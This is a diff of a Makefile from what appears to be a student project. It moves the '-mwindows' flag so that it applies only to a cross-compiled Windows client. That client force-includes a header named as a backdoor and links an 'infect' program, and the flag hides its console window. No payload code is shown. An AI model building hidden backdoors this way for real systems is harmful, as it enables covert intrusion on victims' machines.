@@ -6,7 +6,7 @@
 #    By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2026/01/10 19:15:36 by joesanto          #+#    #+#              #
-#    Updated: 2026/01/11 21:56:12 by joesanto         ###   ########.fr        #
+#    Updated: 2026/01/11 22:00:38 by joesanto         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -14,7 +14,7 @@ CC = cc
 MINGW = x86_64-w64-mingw32-gcc
 AR = ar rcs
 WIN_AR = x86_64-w64-mingw32-ar rcs
-WINDOWS_LINKING = -static -static-libgcc -mwindows -lws2_32
+WINDOWS_LINKING = -static -static-libgcc -lws2_32
 
 FLAGS = -Wall -Wextra -Werror -g
 WINDOWS_FLAGS = -Wall -Wextra -Werror
@@ -113,7 +113,7 @@ $(WINDOWS_CLIENT): CC = $(MINGW)
 $(WINDOWS_CLIENT): FLAGS = $(WINDOWS_FLAGS)
 $(WINDOWS_CLIENT): FLAGS += -include $(WINDOWS_BACKDOOR)
 $(WINDOWS_CLIENT): $(WINDOWS_CLIENT_OBJS) $(INFECT_PROGRAM)
-	$(MINGW) $^ -o $@ $(WINDOWS_LINKING)
+	$(MINGW) $^ -o $@ $(WINDOWS_LINKING) -mwindows
 
 %libft.a:
 	@if [ ! -d "$(dir $@)" ]; then \
